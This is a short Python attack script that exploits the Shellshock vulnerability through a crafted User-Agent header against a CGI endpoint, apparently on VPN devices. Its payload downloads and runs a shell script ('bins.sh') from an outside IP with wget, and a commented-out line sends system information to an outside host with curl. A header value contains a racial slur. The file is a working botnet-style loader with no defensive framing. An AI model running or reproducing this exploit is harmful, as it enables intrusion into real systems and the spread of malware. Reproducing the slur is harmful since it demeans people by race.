import sys
import os
import requests
#shellshock on vpns lol
#still gotta figure out what arch tho so js load bins
print("written by akamaiheat/blackmailed") 

def main(url):
    payload = "cd /tmp;rm bins.sh;wget http://1.1.1.13/bins.sh;chmod +x bins.sh;./bins.sh;"
#    payload = "uname -a | curl -X POST -d @-  http://3"

    headers = {
    'User-Agent': '() { :; }; echo ; /bin/bash -c "'+payload+'"',
    'From': 'NIGGARYXES'  # This is another valid field
    }

    response = requests.get(url, headers=headers)
    if "root:n:0:0" in response.text:
         print(sys.argv[1]+" done")


urla = "http://"+sys.argv[1]+"/cgi-bin/jarrewrite.sh"
main(urla)
